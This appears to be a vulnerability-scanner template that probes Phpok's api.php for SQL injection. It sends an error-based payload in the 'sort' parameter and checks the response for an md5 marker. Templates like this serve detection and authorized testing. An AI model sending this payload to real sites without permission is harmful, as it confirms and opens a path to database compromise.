id: poc-yaml-phpok-sqli
info:
  name: Phpok SQL注入漏洞
  severity: medium
  tags:
  - sql-injection
  finger: Phpok
  reference: []
  description: null
variables:
  r1: random_int(10000, 21000)
transport: http
requests:
- method: GET
  path: /api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{.r1}})))
    --+
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: contains(body, substr(md5(r1),0,31))
  output: []
